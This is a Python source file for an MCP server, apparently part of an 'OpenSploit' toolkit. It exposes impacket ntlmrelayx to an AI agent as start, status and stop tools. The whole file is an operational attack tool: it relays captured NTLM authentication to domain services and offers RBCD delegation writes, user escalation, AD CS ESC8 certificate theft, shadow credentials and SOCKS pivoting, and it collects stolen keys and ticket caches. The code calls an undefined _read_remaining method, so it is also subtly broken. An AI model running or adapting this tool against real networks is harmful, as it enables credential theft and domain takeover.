#!/usr/bin/env python3
"""
OpenSploit MCP Server: impacket-relay

NTLM relay attacks via impacket ntlmrelayx. Listens for incoming NTLM
authentication and relays it to a target service (LDAP, LDAPS, MSSQL, HTTP, SMB).

Long-running service with start/status/stop process management.
Follows the chisel MCP server pattern for stateful process tracking.
"""

import asyncio
import glob
import os
import shutil
import socket
from typing import Any, Dict, Optional

from mcp_common.base_server import BaseMCPServer, ToolResult
from mcp_common.output_parsers import sanitize_output

NTLMRELAYX_BIN = "impacket-ntlmrelayx"


class ImpacketRelayServer(BaseMCPServer):
    """MCP server for ntlmrelayx NTLM relay attacks."""

    def __init__(self):
        super().__init__(
            name="impacket-relay",
            description="NTLM relay attacks via ntlmrelayx",
            version="1.0.0",
        )

        # Track running relay processes: {id: {"process": proc, ...}}
        self.relays: Dict[str, Dict[str, Any]] = {}
        self.next_id = 1

        self.register_method(
            name="start",
            description="Start ntlmrelayx NTLM relay listener. Relays captured NTLM auth to a target service.",
            params={
                "target": {
                    "type": "string",
                    "required": True,
                    "description": "Relay target URL (e.g., 'ldaps://DC01.pirate.htb', 'smb://10.10.10.1')",
                },
                "listen_port": {
                    "type": "integer",
                    "default": 80,
                    "description": "Port to listen on for incoming NTLM auth (HTTP=80, SMB=445)",
                },
                "smb2support": {
                    "type": "boolean",
                    "default": True,
                    "description": "Enable SMB2 support for incoming connections",
                },
                "delegate_access": {
                    "type": "boolean",
                    "default": False,
                    "description": "Write RBCD delegation after successful relay (--delegate-access)",
                },
                "escalate_user": {
                    "type": "string",
                    "description": "Account to escalate privileges for (--escalate-user)",
                },
                "remove_mic": {
                    "type": "boolean",
                    "default": False,
                    "description": "Remove MIC for cross-protocol relay (--remove-mic)",
                },
                "adcs": {
                    "type": "boolean",
                    "default": False,
                    "description": "Perform AD CS relay attack (ESC8). Requires adcs_template.",
                },
                "adcs_template": {
                    "type": "string",
                    "description": "Certificate template for ADCS relay (use with adcs=true).",
                },
                "shadow_credentials": {
                    "type": "boolean",
                    "default": False,
                    "description": "Perform Shadow Credentials relay attack (adds msDS-KeyCredentialLink).",
                },
                "no_smb_server": {
                    "type": "boolean",
                    "default": False,
                    "description": "Disable the default SMB listener (use when only HTTP relay is needed).",
                },
                "no_http_server": {
                    "type": "boolean",
                    "default": False,
                    "description": "Disable the default HTTP listener (use when only SMB relay is needed).",
                },
                "socks": {
                    "type": "boolean",
                    "default": False,
                    "description": "Enable SOCKS proxy for relayed authenticated sessions.",
                },
                "additional_args": {
                    "type": "string",
                    "description": "Additional ntlmrelayx arguments as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 300,
                    "description": "Max time to keep relay running (seconds). Use status to check before timeout.",
                },
            },
            handler=self.start_relay,
        )

        self.register_method(
            name="status",
            description="Check status of a running relay and retrieve captured output",
            params={
                "relay_id": {
                    "type": "string",
                    "required": True,
                    "description": "Relay ID from start method",
                },
            },
            handler=self.relay_status,
        )

        self.register_method(
            name="stop",
            description="Stop a running relay and return final results",
            params={
                "relay_id": {
                    "type": "string",
                    "required": True,
                    "description": "Relay ID to stop",
                },
            },
            handler=self.stop_relay,
        )

    # ── Helpers ─────────────────────────────────────────────────

    def _get_next_id(self) -> str:
        relay_id = f"relay-{self.next_id}"
        self.next_id += 1
        return relay_id

    def _is_port_available(self, port: int) -> bool:
        """Check if a port is available for binding."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(("0.0.0.0", port))
                return True
        except OSError:
            return False

    def _parse_relay_output(self, output: str) -> Dict[str, Any]:
        """Parse ntlmrelayx output for success indicators."""
        result = {
            "connections": [],
            "relay_succeeded": False,
            "delegation_written": False,
            "adcs_succeeded": False,
            "shadow_credentials_succeeded": False,
            "errors": [],
        }

        for line in output.split("\n"):
            stripped = line.strip()
            if not stripped:
                continue

            lower = stripped.lower()

            # Connection received
            if "connection from" in lower:
                result["connections"].append(stripped)
            # Relay success indicators
            if any(ind in lower for ind in [
                "authenticating against",
                "modify_add",
                "written successfully",
                "delegation rights modified",
                "target user found",
            ]):
                result["relay_succeeded"] = True
            # RBCD delegation
            if "delegation" in lower and "written" in lower:
                result["delegation_written"] = True
            # ADCS relay success (certificate obtained)
            if "certificate" in lower and ("generated" in lower or "saved" in lower or "obtained" in lower):
                result["adcs_succeeded"] = True
                result["relay_succeeded"] = True
            # Shadow Credentials success
            if "keycredentiallink" in lower and ("added" in lower or "written" in lower or "updated" in lower):
                result["shadow_credentials_succeeded"] = True
                result["relay_succeeded"] = True
            # Errors
            if stripped.startswith("[-]") or "error" in lower:
                result["errors"].append(stripped)

        return result

    async def _read_output(self, proc, max_bytes: int = 65536) -> str:
        """Non-blocking read of process stdout+stderr."""
        output = ""
        for stream in [proc.stdout, proc.stderr]:
            if stream is None:
                continue
            try:
                data = await asyncio.wait_for(stream.read(max_bytes), timeout=0.5)
                output += data.decode(errors="replace")
            except asyncio.TimeoutError:
                pass
        return output

    # ── Method Handlers ────────────────────────────────────────

    async def start_relay(
        self,
        target: str,
        listen_port: int = 80,
        smb2support: bool = True,
        delegate_access: bool = False,
        escalate_user: Optional[str] = None,
        remove_mic: bool = False,
        adcs: bool = False,
        adcs_template: Optional[str] = None,
        shadow_credentials: bool = False,
        no_smb_server: bool = False,
        no_http_server: bool = False,
        socks: bool = False,
        additional_args: Optional[str] = None,
        timeout: int = 300,
    ) -> ToolResult:
        """Start ntlmrelayx relay listener."""
        # Check port availability
        if not self._is_port_available(listen_port):
            return ToolResult(
                success=False,
                error=f"Port {listen_port} is already in use. Choose a different port or stop the existing listener.",
            )

        cmd = [NTLMRELAYX_BIN, "-t", target]

        if smb2support:
            cmd.append("-smb2support")
        if delegate_access:
            cmd.append("--delegate-access")
        if escalate_user:
            cmd.extend(["--escalate-user", escalate_user])
        if remove_mic:
            cmd.append("--remove-mic")
        if adcs:
            cmd.append("--adcs")
        if adcs_template:
            cmd.extend(["--template", adcs_template])
        if shadow_credentials:
            cmd.append("--shadow-credentials")
        if no_http_server:
            cmd.append("--no-http-server")
        if socks:
            cmd.append("-socks")

        # Set listen port based on protocol
        if listen_port == 445:
            cmd.extend(["--smb-port", str(listen_port)])
        elif listen_port != 80:
            cmd.extend(["--http-port", str(listen_port)])

        # Auto-disable SMB listener when not on port 445 (avoids port conflict),
        # unless socks mode is enabled (socks needs SMB for initial auth)
        if no_smb_server:
            cmd.append("--no-smb-server")
        elif listen_port != 445 and not socks and "--no-smb-server" not in cmd:
            cmd.append("--no-smb-server")

        if additional_args:
            cmd.extend(additional_args.split())

        relay_id = self._get_next_id()
        self.logger.info(f"Starting {relay_id}: {' '.join(cmd)}")

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            # Wait briefly to detect immediate failures
            await asyncio.sleep(3)

            if proc.returncode is not None:
                combined = await self._read_remaining(proc)
                return ToolResult(
                    success=False,
                    error=f"ntlmrelayx exited immediately (code {proc.returncode}): {combined[:500]}",
                    raw_output=sanitize_output(combined),
                )

            # Read initial output
            initial_output = await self._read_output(proc)

            self.relays[relay_id] = {
                "process": proc,
                "pid": proc.pid,
                "target": target,
                "listen_port": listen_port,
                "delegate_access": delegate_access,
                "output_buffer": initial_output,
            }

            return ToolResult(
                success=True,
                data={
                    "relay_id": relay_id,
                    "pid": proc.pid,
                    "target": target,
                    "listen_port": listen_port,
                    "status": "running",
                    "delegate_access": delegate_access,
                },
                raw_output=sanitize_output(initial_output) if initial_output else f"Started {relay_id} — listening on port {listen_port}, relaying to {target}",
            )

        except FileNotFoundError:
            return ToolResult(
                success=False,
                error=f"ntlmrelayx binary not found at {NTLMRELAYX_BIN}. Ensure impacket-scripts is installed.",
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e))

    async def relay_status(self, relay_id: str) -> ToolResult:
        """Check status of a running relay and retrieve captured output."""
        if relay_id not in self.relays:
            return ToolResult(
                success=False,
                error=f"Relay {relay_id} not found. Use 'start' to create a relay.",
            )

        info = self.relays[relay_id]
        proc = info["process"]

        # Read any new output
        new_output = await self._read_output(proc)
        info["output_buffer"] += new_output

        # Check if process is still running
        if proc.returncode is not None:
            # Process ended — drain remaining output safely
            info["output_buffer"] += await self._read_remaining(proc)

            parsed = self._parse_relay_output(info["output_buffer"])
            status = "completed" if parsed["relay_succeeded"] else "exited"

            return ToolResult(
                success=parsed["relay_succeeded"],
                data={
                    "relay_id": relay_id,
                    "status": status,
                    "exit_code": proc.returncode,
                    "relay_succeeded": parsed["relay_succeeded"],
                    "delegation_written": parsed["delegation_written"],
                    "connections": parsed["connections"],
                    "errors": parsed["errors"],
                },
                raw_output=sanitize_output(info["output_buffer"]),
            )

        # Process still running
        parsed = self._parse_relay_output(info["output_buffer"])

        return ToolResult(
            success=True,
            data={
                "relay_id": relay_id,
                "status": "running",
                "pid": proc.pid,
                "relay_succeeded": parsed["relay_succeeded"],
                "delegation_written": parsed["delegation_written"],
                "connections": parsed["connections"],
                "errors": parsed["errors"],
            },
            raw_output=sanitize_output(new_output) if new_output else f"Relay {relay_id} running — no new output",
        )

    async def stop_relay(self, relay_id: str) -> ToolResult:
        """Stop a running relay and return final results."""
        if relay_id not in self.relays:
            return ToolResult(
                success=False,
                error=f"Relay {relay_id} not found.",
            )

        info = self.relays[relay_id]
        proc = info["process"]

        # Terminate process
        if proc.returncode is None:
            try:
                proc.terminate()
                await asyncio.wait_for(proc.wait(), timeout=5)
            except asyncio.TimeoutError:
                proc.kill()
                await proc.wait()

        # Drain remaining output safely (with timeout to avoid hanging on broken pipes)
        info["output_buffer"] += await self._read_remaining(proc)

        parsed = self._parse_relay_output(info["output_buffer"])
        final_output = info["output_buffer"]

        # Collect relay artifacts (certificates, keys, etc.)
        artifact_dir = "/session/relay"
        collected_artifacts = []
        try:
            os.makedirs(artifact_dir, exist_ok=True)
            for ext in ["*.pfx", "*.pem", "*.key", "*.cert", "*.ccache"]:
                for f in glob.glob(ext):
                    shutil.copy2(f, artifact_dir)
                    collected_artifacts.append(os.path.basename(f))
        except Exception as e:
            self.logger.warning(f"Artifact collection failed: {e}")
        if collected_artifacts:
            parsed["artifacts"] = collected_artifacts

        # Wait for port release
        listen_port = info.get("listen_port")
        if listen_port:
            for _ in range(5):
                if self._is_port_available(listen_port):
                    break
                await asyncio.sleep(1)

        del self.relays[relay_id]

        return ToolResult(
            success=True,
            data={
                "relay_id": relay_id,
                "status": "stopped",
                "relay_succeeded": parsed["relay_succeeded"],
                "delegation_written": parsed["delegation_written"],
                "connections": parsed["connections"],
                "errors": parsed["errors"],
            },
            raw_output=sanitize_output(final_output),
        )


if __name__ == "__main__":
    ImpacketRelayServer.main()
